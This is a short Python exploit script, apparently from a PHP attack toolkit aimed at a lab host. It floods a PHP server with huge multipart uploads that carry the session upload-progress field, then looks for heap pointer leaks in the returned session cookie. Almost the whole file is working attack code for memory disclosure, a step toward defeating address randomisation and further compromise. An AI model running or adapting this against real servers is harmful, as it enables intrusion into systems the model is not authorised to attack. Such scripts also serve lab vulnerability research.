#!/usr/bin/env python3
"""EN BASIT brute force — 2 istek, en basit sinyal.

Step 1: OOM (tek buyuk field, size vary)
Step 2: SIMPLE session-init (PHPSESSID + PROGRESS, no shapers)
Signal: Set-Cookie length (32B=clean, >32B=leak)

Hizli: her iterasyon <1s.

Usage:
  python3 bf_min.py --port 18113 --sizes 1,2,4,8,16,32,64,128,256
"""
from __future__ import annotations
import argparse
import time

from common import (Target, build_multipart, parse_cookie,
                    count_heap_pointers)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="LAB_IP")
    ap.add_argument("--port", type=int, default=18113)
    ap.add_argument("--sizes", default="1,2,4,8,16,32,64,128,256")
    args = ap.parse_args()

    t = Target(args.host, args.port, verbose=False)
    bnd = b"S" * 17
    sizes = [int(s) for s in args.sizes.split(",")]

    print(f"{'MB':>5} | {'st1':>4} | {'st2':>4} | {'cookie2':>8} | {'base':>10} | {'cnt':>4} | signal",
          flush=True)
    print("-" * 70, flush=True)

    for size in sizes:
        # Step 1: OOM
        parts1 = [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            {"name": "big", "data": b"B" * (size * 1024 * 1024)},
        ]
        body1 = build_multipart(parts1, bnd)
        st1, _ = t.post_chunked(body1, bnd, read_cap=1 << 20)
        time.sleep(0.2)

        # Step 2: SIMPLE session-init
        parts2 = [
            {"name": "PHPSESSID", "data": b"attacksessionid0001"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        body2 = build_multipart(parts2, b"BNDRY12345")
        st2, raw2 = t.post_chunked(body2, b"BNDRY12345", read_cap=1 << 20)
        cookie = parse_cookie(raw2)
        clen = len(cookie)
        base, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
        signal = "LEAK!" if (clen > 100 and cnt >= 8) else ("big" if clen > 100 else "clean")
        print(f"{size:>5} | {st1:>4} | {st2:>4} | {clen:>7}B | 0x{base:08x} | {cnt:>4} | {signal}",
              flush=True)
        time.sleep(0.2)

    print("-" * 70, flush=True)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
